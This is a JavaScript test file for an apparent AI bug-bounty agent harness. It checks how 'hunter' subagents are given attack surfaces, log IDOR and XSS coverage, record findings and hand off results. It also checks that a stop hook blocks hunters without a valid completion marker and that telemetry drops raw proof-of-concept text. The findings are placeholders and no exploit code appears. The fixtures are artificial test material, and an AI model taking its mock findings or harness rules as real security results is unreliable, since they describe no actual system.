    assert.equal(invalid.error.details.block_code, "invalid_handoff");
    assert.equal(invalid.error.details.handoff.present, true);
    assert.equal(invalid.error.details.handoff.valid, false);

    writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "A1 complete.",
      chain_notes: ["No chain."],
      content: "# a1",
    });
    const mismatch = await executeTool("bounty_finalize_hunter_run", {
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-b",
    });
    assert.equal(mismatch.ok, false);
    assert.equal(mismatch.error.details.block_code, "handoff_mismatch");
    assert.equal(mismatch.error.details.handoff.valid, true);
    assert.equal(mismatch.error.details.handoff.surface_status, "complete");
    assert.equal(mismatch.error.details.handoff.chain_notes_count, 1);

    const rows = readJsonl(agentRunTelemetryPath());
    assert.deepEqual(rows.map((row) => row.status), ["blocked", "blocked", "blocked"]);
    assert.deepEqual(rows.map((row) => row.block_code), [
      "missing_handoff",
      "invalid_handoff",
      "handoff_mismatch",
    ]);
    assert.ok(rows.every((row) => row.telemetry_source === "bounty_finalize_hunter_run"));

    const pipelineRows = readJsonl(pipelineEventsJsonlPath(domain));
    assert.deepEqual(
      pipelineRows.filter((row) => row.type === "hunter_stopped").map((row) => row.source),
      ["bounty_finalize_hunter_run", "bounty_finalize_hunter_run", "bounty_finalize_hunter_run"],
    );
  });
});

test("bounty_finalize_hunter_run allows valid handoff and records metadata-only telemetry", async () => {
  await withTempHome(async () => {
    const domain = "example.com";
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "A1 complete.",
      chain_notes: ["No chain."],
      content: "# a1\n\nraw handoff body is not telemetry",
    });
    logCoverage({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      entries: [{
        endpoint: "/tested",
        method: "GET",
        bug_class: "idor",
        status: "tested",
        evidence_summary: "tested",
      }],
    });
    recordFinding({
      target_domain: domain,
      title: "IDOR",
      severity: "high",
      endpoint: "/tested",
      description: "Cross-account access.",
      proof_of_concept: "raw finding proof should not enter telemetry",
      validated: true,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
    });

    const direct = JSON.parse(finalizeHunterRun({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
    }));
    assert.equal(direct.status, "allowed");
    assert.equal(direct.message, "handoff valid");
    assert.deepEqual(direct.handoff, {
      present: true,
      valid: true,
      provenance: "legacy_unverified",
      surface_status: "complete",
      summary_present: true,
      chain_notes_count: 1,
    });

    const rows = readJsonl(agentRunTelemetryPath());
    assert.equal(rows.length, 1);
    assert.equal(rows[0].status, "allowed");
    assert.equal(rows[0].block_code, null);
    assert.equal(rows[0].telemetry_source, "bounty_finalize_hunter_run");
    assert.deepEqual(rows[0].coverage, { total: 1, by_status: { tested: 1 } });
    assert.deepEqual(rows[0].findings, { count: 1 });
    assert.equal(JSON.stringify(rows[0]).includes("raw handoff body"), false);
    assert.equal(JSON.stringify(rows[0]).includes("raw finding proof"), false);
  });
});

test("executeTool smoke path uses envelopes for init, wave, handoff, and merge", async () => {
  await withTempHome(async () => {
    const domain = "smoke.example";
    const init = await executeTool("bounty_init_session", {
      target_domain: domain,
      target_url: `https://${domain}`,
    });
    assert.equal(init.ok, true);

    seedAttackSurface(domain, ["surface-a"]);
    assert.equal((await executeTool("bounty_transition_phase", { target_domain: domain, to_phase: "AUTH" })).ok, true);
    assert.equal((await executeTool("bounty_transition_phase", {
      target_domain: domain,
      to_phase: "HUNT",
      auth_status: "unauthenticated",
    })).ok, true);

    const started = await executeTool("bounty_start_wave", {
      target_domain: domain,
      wave_number: 1,
      assignments: [{ agent: "a1", surface_id: "surface-a" }],
    });
    assert.equal(started.ok, true);

    const handoff = await executeTool("bounty_write_wave_handoff", {
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      handoff_token: started.data.assignments[0].handoff_token,
      summary: "Smoke handoff summary.",
      chain_notes: ["Smoke chain note."],
      content: "# Smoke",
    });
    assert.equal(handoff.ok, true);

    const finalized = await executeTool("bounty_finalize_hunter_run", {
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
    });
    assert.equal(finalized.ok, true);
    assert.equal(finalized.data.status, "allowed");

    const merged = await executeTool("bounty_apply_wave_merge", {
      target_domain: domain,
      wave_number: 1,
      force_merge: false,
    });
    assert.equal(merged.ok, true);
    assert.equal(merged.data.status, "merged");
    assert.equal(merged.data.state.hunt_wave, 1);
  });
});

test("hunter SubagentStop hook blocks missing final marker", () => {
  withTempHome((tempHome) => {
    const result = runHunterSubagentStop({
      last_assistant_message: "I wrote notes but no marker.",
    }, { home: tempHome });

    assert.equal(result.status, 2);
    assert.match(result.stderr, /BOB_HUNTER_DONE/);
    assert.match(result.stderr, /bounty_write_wave_handoff/);

    const rows = readJsonl(agentRunTelemetryPath());
    assert.equal(rows.length, 1);
    assert.equal(rows[0].run_type, "hunter");
    assert.equal(rows[0].status, "blocked");
    assert.equal(rows[0].block_code, "missing_marker");
    assert.equal(rows[0].target_domain, null);
    assert.equal(rows[0].telemetry_source, "hunter-subagent-stop");
  });
});

test("hunter SubagentStop hook rejects malformed, zero wave, and zero agent markers", () => {
  withTempHome((tempHome) => {
    const malformed = runHunterSubagentStop({
      last_assistant_message: 'BOB_HUNTER_DONE {"target_domain":"example.com","wave":"w1","agent":"a1","surface_id":}',
    }, { home: tempHome });
    assert.equal(malformed.status, 2);
    assert.match(malformed.stderr, /BOB_HUNTER_DONE/);

    const zeroWave = runHunterSubagentStop({
      last_assistant_message: 'BOB_HUNTER_DONE {"target_domain":"example.com","wave":"w0","agent":"a1","surface_id":"surface-a"}',
    }, { home: tempHome });
    assert.equal(zeroWave.status, 2);
    assert.match(zeroWave.stderr, /positive wN/);

    const zeroAgent = runHunterSubagentStop({
      last_assistant_message: 'BOB_HUNTER_DONE {"target_domain":"example.com","wave":"w1","agent":"a0","surface_id":"surface-a"}',
    }, { home: tempHome });
    assert.equal(zeroAgent.status, 2);
    assert.match(zeroAgent.stderr, /positive aN/);

    const rows = readJsonl(agentRunTelemetryPath());
    assert.equal(rows.length, 3);
    assert.deepEqual(rows.map((row) => row.block_code), [
      "malformed_marker",
      "malformed_marker",
      "malformed_marker",
    ]);
    assert.equal(rows[1].wave, "w0");
    assert.equal(rows[2].agent, "a0");
  });
});

test("hunter SubagentStop hook blocks missing structured handoff", async () => {
  await withTempHome(async (tempHome) => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 0 });
    seedAttackSurface(domain, ["surface-a"]);
    await executeTool("bounty_start_wave", {
      target_domain: domain,
      wave_number: 1,
      assignments: [{ agent: "a1", surface_id: "surface-a" }],
    });

    const result = runHunterSubagentStop({
      last_assistant_message: 'BOB_HUNTER_DONE {"target_domain":"example.com","wave":"w1","agent":"a1","surface_id":"surface-a"}',
    }, { home: tempHome });

    assert.equal(result.status, 2);
    assert.match(result.stderr, /must call bounty_write_wave_handoff/);

    const rows = readJsonl(agentRunTelemetryPath());
    assert.equal(rows.length, 1);
    assert.equal(rows[0].status, "blocked");
    assert.equal(rows[0].block_code, "missing_handoff");
    assert.equal(rows[0].target_domain, domain);
    assert.equal(rows[0].wave, "w1");
    assert.equal(rows[0].agent, "a1");
    assert.equal(rows[0].surface_id, "surface-a");
    assert.deepEqual(rows[0].handoff, {
      present: false,
      valid: false,
      provenance: null,
      surface_status: null,
      summary_present: false,
      chain_notes_count: 0,
    });

    const pipelineRows = readJsonl(pipelineEventsJsonlPath(domain));
    const stopped = pipelineRows.find((row) => row.type === "hunter_stopped");
    assert.ok(stopped);
    assert.equal(stopped.status, "blocked");
    assert.equal(stopped.block_code, "missing_handoff");
    assert.equal(stopped.wave_number, 1);
    assert.equal(stopped.agent, "a1");
    assert.equal(stopped.surface_id, "surface-a");
  });
});

test("hunter SubagentStop hook blocks invalid structured handoff", () => {
  withTempHome((tempHome) => {
    const domain = "example.com";
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    writeFileAtomic(path.join(sessionDir(domain), "handoff-w1-a1.json"), "{bad json");

    const result = runHunterSubagentStop({
      last_assistant_message: 'BOB_HUNTER_DONE {"target_domain":"example.com","wave":"w1","agent":"a1","surface_id":"surface-a"}',
    }, { home: tempHome });

    assert.equal(result.status, 2);
    assert.match(result.stderr, /wrote an invalid handoff/);

    const rows = readJsonl(agentRunTelemetryPath());
    assert.equal(rows.length, 1);
    assert.equal(rows[0].status, "blocked");
    assert.equal(rows[0].block_code, "invalid_handoff");
    assert.equal(rows[0].handoff.present, true);
    assert.equal(rows[0].handoff.valid, false);
  });
});

test("hunter SubagentStop hook blocks marker and handoff mismatch", () => {
  withTempHome((tempHome) => {
    const domain = "example.com";
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "a1 complete",
      chain_notes: ["no chain"],
      content: "# a1",
    });

    const result = runHunterSubagentStop({
      last_assistant_message: 'BOB_HUNTER_DONE {"target_domain":"example.com","wave":"w1","agent":"a1","surface_id":"surface-b"}',
    }, { home: tempHome });

    assert.equal(result.status, 2);
    assert.match(result.stderr, /does not match structured handoff/);

    const rows = readJsonl(agentRunTelemetryPath());
    assert.equal(rows.length, 1);
    assert.equal(rows[0].status, "blocked");
    assert.equal(rows[0].block_code, "handoff_mismatch");
    assert.equal(rows[0].surface_id, "surface-b");
    assert.equal(rows[0].handoff.present, true);
    assert.equal(rows[0].handoff.valid, true);
    assert.equal(rows[0].handoff.surface_status, "complete");
    assert.equal(rows[0].handoff.summary_present, true);
    assert.equal(rows[0].handoff.chain_notes_count, 1);
  });
});

test("hunter SubagentStop hook allows incomplete waves without merging", async () => {
  await withTempHome(async (tempHome) => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 0 });
    seedAttackSurface(domain, ["surface-a", "surface-b"]);
    const started = await executeTool("bounty_start_wave", {
      target_domain: domain,
      wave_number: 1,
      assignments: [
        { agent: "a1", surface_id: "surface-a" },
        { agent: "a2", surface_id: "surface-b" },
      ],
    });
    const token = started.data.assignments.find((assignment) => assignment.agent === "a1").handoff_token;
    await executeTool("bounty_write_wave_handoff", {
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      handoff_token: token,
      summary: "a1 complete",
      content: "# a1",
    });

    const result = runHunterSubagentStop({
      last_assistant_message: 'BOB_HUNTER_DONE {"target_domain":"example.com","wave":"w1","agent":"a1","surface_id":"surface-a"}',
    }, { home: tempHome });

    assert.equal(result.status, 0);
    const state = JSON.parse(readStateSummary({ target_domain: domain })).state;
    assert.equal(state.pending_wave, 1);
    assert.equal(state.hunt_wave, 0);
  });
});

test("hunter SubagentStop hook allows a complete wave without merging", async () => {
  await withTempHome(async (tempHome) => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 0 });
    seedAttackSurface(domain, ["surface-a"]);
    const started = await executeTool("bounty_start_wave", {
      target_domain: domain,
      wave_number: 1,
      assignments: [{ agent: "a1", surface_id: "surface-a" }],
    });
    await executeTool("bounty_write_wave_handoff", {
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      handoff_token: started.data.assignments[0].handoff_token,
      summary: "a1 complete",
      content: "# a1",
    });

    const result = runHunterSubagentStop({
      last_assistant_message: 'BOB_HUNTER_DONE {"target_domain":"example.com","wave":"w1","agent":"a1","surface_id":"surface-a"}',
    }, { home: tempHome });

    assert.equal(result.status, 0);
    assert.match(result.stdout, /handoff valid/);
    const state = JSON.parse(readStateSummary({ target_domain: domain })).state;
    assert.equal(state.pending_wave, 1);
    assert.equal(state.hunt_wave, 0);
  });
});

test("hunter SubagentStop hook writes metadata-only allowed run telemetry", () => {
  withTempHome((tempHome) => {
    const domain = "example.com";
    const transcriptPath = path.join(tempHome, "transcript.jsonl");
    const rawTranscriptSecret = "raw-transcript-secret";
    const rawHandoffSecret = "raw-handoff-markdown-secret";
    const rawFindingSecret = "raw-finding-poc-secret";
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "a1 complete",
      chain_notes: ["no chain"],
      content: `# a1\n\n${rawHandoffSecret}`,
    });
    logCoverage({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      entries: [
        {
          endpoint: "/tested",
          method: "GET",
          bug_class: "idor",
          status: "tested",
          evidence_summary: "tested",
        },
        {
          endpoint: "/promising",
          method: "POST",
          bug_class: "xss",
          status: "promising",
          evidence_summary: "promising",
        },
      ],
    });
    recordFinding({
      target_domain: domain,
      title: "IDOR",
      severity: "high",
      endpoint: "/tested",
      description: "Cross-account access.",
      proof_of_concept: rawFindingSecret,
      validated: true,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
    });
    fs.writeFileSync(transcriptPath, `${JSON.stringify({
      message: {
        role: "assistant",
        content: [{ text: `${rawTranscriptSecret}\nBOB_HUNTER_DONE {"target_domain":"example.com","wave":"w1","agent":"a1","surface_id":"surface-a"}` }],
      },
    })}\n`);

    const result = runHunterSubagentStop({ transcript_path: transcriptPath }, { home: tempHome });

    assert.equal(result.status, 0);
    assert.match(result.stdout, /handoff valid/);

    const rows = readJsonl(agentRunTelemetryPath());
    assert.equal(rows.length, 1);
    const event = rows[0];
    assert.equal(event.version, 1);
    assert.match(event.run_id, /^[a-f0-9]{16}$/);
    assert.equal(event.run_type, "hunter");
    assert.equal(event.status, "allowed");
    assert.equal(event.block_code, null);
    assert.equal(event.target_domain, domain);
    assert.equal(event.wave, "w1");
    assert.equal(event.agent, "a1");
    assert.equal(event.surface_id, "surface-a");
    assert.equal(event.transcript_path, transcriptPath);
    assert.deepEqual(event.handoff, {
      present: true,
      valid: true,
      provenance: "legacy_unverified",
      surface_status: "complete",
      summary_present: true,
      chain_notes_count: 1,
    });
    assert.deepEqual(event.coverage, {
      total: 2,
      by_status: { tested: 1, promising: 1 },
    });
    assert.deepEqual(event.findings, { count: 1 });
    assert.equal(event.telemetry_source, "hunter-subagent-stop");

    const sidecar = JSON.parse(fs.readFileSync(agentRunSidecarPath(event.run_id), "utf8"));
    assert.deepEqual(sidecar, event);

    const telemetryText = JSON.stringify(event);
    assert.equal(telemetryText.includes(rawTranscriptSecret), false);
    assert.equal(telemetryText.includes(rawHandoffSecret), false);
    assert.equal(telemetryText.includes(rawFindingSecret), false);
  });
});

test("hunter SubagentStop telemetry can be disabled and write failures do not alter hook results", () => {
  withTempHome((tempHome) => {
    const domain = "example.com";
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "a1 complete",
      content: "# a1",
    });

    const disabled = runHunterSubagentStop({
      last_assistant_message: 'BOB_HUNTER_DONE {"target_domain":"example.com","wave":"w1","agent":"a1","surface_id":"surface-a"}',
    }, { home: tempHome, env: { BOUNTY_TELEMETRY: "0" } });
    assert.equal(disabled.status, 0);
    assert.equal(fs.existsSync(agentRunTelemetryPath()), false);

    const blockingPath = path.join(tempHome, "telemetry-root-file");
    fs.writeFileSync(blockingPath, "not a directory\n");
    const allowed = runHunterSubagentStop({
      last_assistant_message: 'BOB_HUNTER_DONE {"target_domain":"example.com","wave":"w1","agent":"a1","surface_id":"surface-a"}',
    }, { home: tempHome, env: { BOUNTY_TELEMETRY_DIR: blockingPath } });
    assert.equal(allowed.status, 0);
    assert.match(allowed.stdout, /handoff valid/);

    const blocked = runHunterSubagentStop({
      last_assistant_message: "No marker.",
    }, { home: tempHome, env: { BOUNTY_TELEMETRY_DIR: blockingPath } });
    assert.equal(blocked.status, 2);
    assert.match(blocked.stderr, /BOB_HUNTER_DONE/);
  });
});

test("hunter SubagentStop hook treats stale completion notifications as valid handoffs", async () => {
  await withTempHome(async (tempHome) => {
    const domain = "example.com";
    seedSessionState(domain, { phase: "HUNT", hunt_wave: 0 });
    seedAttackSurface(domain, ["surface-a"]);
    const started = await executeTool("bounty_start_wave", {
      target_domain: domain,
      wave_number: 1,
      assignments: [{ agent: "a1", surface_id: "surface-a" }],
    });
    await executeTool("bounty_write_wave_handoff", {
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      handoff_token: started.data.assignments[0].handoff_token,
      summary: "a1 complete",
      content: "# a1",
    });
    const merged = await executeTool("bounty_apply_wave_merge", {
      target_domain: domain,
      wave_number: 1,
      force_merge: false,
    });
    assert.equal(merged.ok, true);
    assert.equal(merged.data.status, "merged");

    const result = runHunterSubagentStop({
      last_assistant_message: 'BOB_HUNTER_DONE {"target_domain":"example.com","wave":"w1","agent":"a1","surface_id":"surface-a"}',
    }, { home: tempHome });

    assert.equal(result.status, 0);
    assert.match(result.stdout, /handoff valid/);
    const state = JSON.parse(readStateSummary({ target_domain: domain })).state;
    assert.equal(state.pending_wave, null);
    assert.equal(state.hunt_wave, 1);
  });
});

test("bounty_log_coverage appends validated records to coverage.jsonl", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);

    const result = JSON.parse(logCoverage({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      entries: [
        {
          endpoint: "/api/v1/users/123",
          method: "get",
          bug_class: "IDOR",
          auth_profile: "attacker-victim",
          status: "tested",
          evidence_summary: "attacker/victim replay both returned 403",
          next_step: "try legacy export route",
        },
        {
          endpoint: "/api/v1/export",
          bug_class: "business_logic",
          status: "promising",
          evidence_summary: "export job accepted attacker-controlled account_id",
        },
      ],
    }));

    assert.equal(result.appended, 2);
    assert.equal(result.log_path, coverageJsonlPath(domain));
    assert.deepEqual(result.statuses, {
      tested: 1,
      blocked: 0,
      promising: 1,
      needs_auth: 0,
      requeue: 0,
    });

    const records = readCoverageRecordsFromJsonl(domain);
    assert.equal(records.length, 2);
    assert.equal(records[0].target_domain, domain);
    assert.equal(records[0].method, "GET");
    assert.equal(records[0].bug_class, "idor");
    assert.equal(records[0].auth_profile, "attacker-victim");
    assert.equal(records[0].next_step, "try legacy export route");
    assert.equal(records[1].method, null);
  });
});

test("appendJsonlLine retention keeps the newest records", () => {
  withTempHome((tempHome) => {
    const logPath = path.join(tempHome, "retention.jsonl");
    for (let index = 0; index < 5; index += 1) {
      appendJsonlLine(logPath, { index }, { maxRecords: 3 });
    }

    assert.deepEqual(
      fs.readFileSync(logPath, "utf8").trim().split("\n").map((line) => JSON.parse(line).index),
      [2, 3, 4],
    );

    const trimResult = trimJsonlFile(logPath, 2);
    assert.deepEqual(trimResult, { trimmed: true, total: 3, retained: 2 });
    assert.deepEqual(
      fs.readFileSync(logPath, "utf8").trim().split("\n").map((line) => JSON.parse(line).index),
      [3, 4],
    );
  });
});

test("coverage log retention keeps newest records under the session cap", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);

    const entries = Array.from({ length: COVERAGE_LOG_MAX_RECORDS + 1 }, (_, index) => ({
      endpoint: `/api/coverage-${index}`,
      bug_class: "idor",
      status: "tested",
      evidence_summary: `coverage ${index}`,
    }));

    logCoverage({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      entries,
    });

    const records = readCoverageRecordsFromJsonl(domain);
    assert.equal(records.length, COVERAGE_LOG_MAX_RECORDS);
    assert.equal(records[0].endpoint, "/api/coverage-1");
    assert.equal(records.at(-1).endpoint, `/api/coverage-${COVERAGE_LOG_MAX_RECORDS}`);
  });
});

test("HTTP audit retention keeps newest records under the session cap", () => {
  withTempHome(() => {
    const domain = "example.com";
    for (let index = 0; index < HTTP_AUDIT_LOG_MAX_RECORDS + 1; index += 1) {
      appendHttpAuditRecord({
        version: 1,
        ts: new Date(index).toISOString(),
        target_domain: domain,
        method: "GET",
        url: `https://${domain}/audit-${index}`,
        host: domain,
        scope_decision: "allowed",
        status: 200,
      });
    }

    const records = readHttpAuditRecordsFromJsonl(domain);
    assert.equal(records.length, HTTP_AUDIT_LOG_MAX_RECORDS);
    assert.equal(records[0].path, "/audit-1");
    assert.equal(records.at(-1).path, `/audit-${HTTP_AUDIT_LOG_MAX_RECORDS}`);
  });
});

test("imported traffic retention keeps newest records under the session cap", () => {
  withTempHome(() => {
    const domain = "example.com";
    let nextIndex = 0;
    const totalEntries = TRAFFIC_LOG_MAX_RECORDS + 1;

    while (nextIndex < totalEntries) {
      const batchSize = Math.min(TRAFFIC_IMPORT_MAX_ENTRIES, totalEntries - nextIndex);
      const entries = Array.from({ length: batchSize }, (_, offset) => {
        const index = nextIndex + offset;
        return {
          method: "GET",
          url: `https://${domain}/traffic-${index}`,
          status: 200,
        };
      });

      importHttpTraffic({
        target_domain: domain,
        source: "manual",
        entries,
      });
      nextIndex += batchSize;
    }

    const records = readTrafficRecordsFromJsonl(domain);
    assert.equal(records.length, TRAFFIC_LOG_MAX_RECORDS);
    assert.equal(records[0].path, "/traffic-1");
    assert.equal(records.at(-1).path, `/traffic-${TRAFFIC_LOG_MAX_RECORDS}`);
  });
});

test("bounty_log_coverage rejects invalid assignment metadata and malformed entries", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    const validEntry = {
      endpoint: "/api/v1/users/123",
      bug_class: "idor",
      status: "tested",
      evidence_summary: "403 for attacker and victim",
    };

    assert.throws(
      () => logCoverage({ target_domain: domain, wave: "1", agent: "a1", surface_id: "surface-a", entries: [validEntry] }),
      /wave must match wN/,
    );
    assert.throws(
      () => logCoverage({ target_domain: domain, wave: "w1", agent: "agent1", surface_id: "surface-a", entries: [validEntry] }),
      /agent must match aN/,
    );
    assert.throws(
      () => logCoverage({ target_domain: domain, wave: "w1", agent: "a2", surface_id: "surface-a", entries: [validEntry] }),
      /Agent a2 is not assigned in wave w1/,
    );
    assert.throws(
      () => logCoverage({ target_domain: domain, wave: "w1", agent: "a1", surface_id: "surface-b", entries: [validEntry] }),
      /Agent a1 is assigned surface surface-a, not surface-b/,
    );
    assert.throws(
      () => logCoverage({ target_domain: domain, wave: "w1", agent: "a1", surface_id: "surface-a", entries: [] }),
      /entries must be a non-empty array/,
    );
    assert.throws(
      () => logCoverage({
        target_domain: domain,
        wave: "w1",
        agent: "a1",
        surface_id: "surface-a",
        entries: [{ ...validEntry, status: "done" }],
      }),
      /entries\[0\]\.status must be one of tested, blocked, promising, needs_auth, requeue/,
    );
    assert.throws(
      () => logCoverage({
        target_domain: domain,
        wave: "w1",
        agent: "a1",
        surface_id: "surface-a",
        entries: [{ ...validEntry, endpoint: " " }],
      }),
      /entries\[0\]\.endpoint must be a non-empty string/,
    );
  });
});

test("bounty_wave_handoff_status reports complete when all assigned handoffs exist", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAssignments(domain, 1, [
      { agent: "a1", surface_id: "surface-a" },
      { agent: "a2", surface_id: "surface-b" },
    ]);

    writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "A1 complete.",
      content: "# A1",
    });

    writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a2",
      surface_id: "surface-b",
      surface_status: "partial",
      summary: "A2 partial.",
      content: "# A2",
    });

    const status = JSON.parse(waveHandoffStatus({ target_domain: domain, wave_number: 1 }));

    assert.deepEqual(status, {
      assignments_total: 2,
      handoffs_total: 2,
      received_agents: ["a1", "a2"],
      missing_agents: [],
      unexpected_agents: [],
      is_complete: true,
    });
  });
});

test("markdown-only handoffs do not satisfy readiness or advance merges", () => {
  withTempHome(() => {
    const domain = "example.com";
    const dir = sessionDir(domain);
    seedSessionState(domain, { phase: "HUNT", pending_wave: 1 });
    seedAttackSurface(domain, ["surface-a"]);
    seedAssignments(domain, 1, [{ agent: "a1", surface_id: "surface-a" }]);
    writeFileAtomic(path.join(dir, "handoff-w1-a1.md"), "# markdown only\n");

    const before = fs.readFileSync(statePath(domain), "utf8");
    const status = JSON.parse(waveHandoffStatus({ target_domain: domain, wave_number: 1 }));
    assert.deepEqual(status, {
      assignments_total: 1,
      handoffs_total: 0,
      received_agents: [],
      missing_agents: ["a1"],
      unexpected_agents: [],
      is_complete: false,
    });

    const pending = JSON.parse(applyWaveMerge({
      target_domain: domain,
      wave_number: 1,
      force_merge: false,
    }));
    assert.equal(pending.status, "pending");
    assert.deepEqual(pending.readiness, status);
    assert.equal(fs.readFileSync(statePath(domain), "utf8"), before);
    assert.ok(!fs.existsSync(path.join(dir, "wave-2-assignments.json")));

    writeWaveHandoff({
      target_domain: domain,
      wave: "w1",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "Structured handoff summary.",
      content: "# structured handoff",
    });

    const merged = JSON.parse(applyWaveMerge({
      target_domain: domain,
      wave_number: 1,
      force_merge: false,
    }));
    assert.equal(merged.status, "merged");
    assert.deepEqual(merged.readiness, {
      assignments_total: 1,
      handoffs_total: 1,
      received_agents: ["a1"],
      missing_agents: [],
      unexpected_agents: [],
      is_complete: true,
    });
  });
});

test("bounty_wave_handoff_status reports partial completion and unexpected handoffs without parsing payloads", () => {
  withTempHome(() => {
    const domain = "example.com";
    const dir = sessionDir(domain);
    fs.mkdirSync(dir, { recursive: true });

    seedAssignments(domain, 2, [
      { agent: "a1", surface_id: "surface-a" },
      { agent: "a2", surface_id: "surface-b" },
      { agent: "a3", surface_id: "surface-c" },
    ]);

    writeFileAtomic(path.join(dir, "handoff-w2-a1.json"), "{bad json");
    writeUnexpectedHandoff(domain, "w2", "a9");

    const status = JSON.parse(waveHandoffStatus({ target_domain: domain, wave_number: 2 }));

    assert.deepEqual(status, {
      assignments_total: 3,
      handoffs_total: 2,
      received_agents: ["a1"],
      missing_agents: ["a2", "a3"],
      unexpected_agents: ["a9"],
      is_complete: false,
    });
  });
});

test("bounty_wave_handoff_status hard-fails when the assignment file is missing", () => {
  withTempHome(() => {
    assert.throws(
      () => waveHandoffStatus({ target_domain: "example.com", wave_number: 7 }),
      /Missing assignment file/,
    );
  });
});

test("bounty_merge_wave_handoffs merges valid handoffs and dedupes optional arrays", () => {
  withTempHome(() => {
    const domain = "example.com";
    seedAssignments(domain, 2, [
      { agent: "a1", surface_id: "surface-a" },
      { agent: "a2", surface_id: "surface-b" },
    ]);

    writeWaveHandoff({
      target_domain: domain,
      wave: "w2",
      agent: "a1",
      surface_id: "surface-a",
      surface_status: "complete",
      summary: "A1 complete.",
      content: "# A1",
      dead_ends: [" /users/1 ", "/users/1", ""],
      waf_blocked_endpoints: ["/admin"],
      lead_surface_ids: ["surface-b", "surface-b", "surface-c"],
    });

    writeWaveHandoff({
      target_domain: domain,
      wave: "w2",
      agent: "a2",
      surface_id: "surface-b",
      surface_status: "partial",
      summary: "A2 partial.",
      content: "# A2",
      dead_ends: ["/billing"],
      waf_blocked_endpoints: ["/admin", " /reports "],
      lead_surface_ids: ["surface-c", "surface-d"],
    });

    const merged = JSON.parse(mergeWaveHandoffs({ target_domain: domain, wave_number: 2 }));

    assert.deepEqual(merged, {
      assignments_total: 2,
      handoffs_total: 2,
      received_agents: ["a1", "a2"],
      invalid_agents: [],
      unexpected_agents: [],
      completed_surface_ids: ["surface-a"],
      partial_surface_ids: ["surface-b"],
      missing_surface_ids: [],
      dead_ends: ["/users/1", "/billing"],
      waf_blocked_endpoints: ["/admin", "/reports"],
      lead_surface_ids: ["surface-b", "surface-c", "surface-d"],
      blocked_harness_runs: [],
      blocked_harness_runs_grouped: [],
      bypass_attempts: [],
      bypass_attempts_grouped: [],
      suspicion_flags: [],
      provenance: {
        verified_agents: [],
        legacy_unverified_agents: ["a1", "a2"],
      },
    });
  });
});

test("bounty_merge_wave_handoffs requeues missing and invalid assigned handoffs while ignoring unexpected agents", () => {
  withTempHome(() => {
    const domain = "example.com";
    const dir = sessionDir(domain);
    fs.mkdirSync(dir, { recursive: true });

    seedAssignments(domain, 3, [
      { agent: "a1", surface_id: "surface-a" },
      { agent: "a2", surface_id: "surface-b" },
    ]);

    writeFileAtomic(path.join(dir, "handoff-w3-a1.json"), "{bad json");
    writeUnexpectedHandoff(domain, "w3", "a9", { dead_ends: ["/ignored"] });

    const merged = JSON.parse(mergeWaveHandoffs({ target_domain: domain, wave_number: 3 }));

    assert.deepEqual(merged, {
      assignments_total: 2,
      handoffs_total: 2,
      received_agents: [],
      invalid_agents: ["a1"],
      unexpected_agents: ["a9"],
      completed_surface_ids: [],
      partial_surface_ids: [],
      missing_surface_ids: ["surface-b"],
      dead_ends: [],
      waf_blocked_endpoints: [],
      lead_surface_ids: [],
      blocked_harness_runs: [],
      blocked_harness_runs_grouped: [],
      bypass_attempts: [],
      bypass_attempts_grouped: [],
      suspicion_flags: [],
      provenance: {
        verified_agents: [],
        legacy_unverified_agents: [],
      },
    });
  });
});

test("bounty_read_wave_handoffs returns validated structured summaries and ignores markdown", () => {
  withTempHome(() => {
    const domain = "example.com";
    const dir = sessionDir(domain);
    fs.mkdirSync(dir, { recursive: true });
    seedAssignments(domain, 1, [
      { agent: "a1", surface_id: "surface-a" },
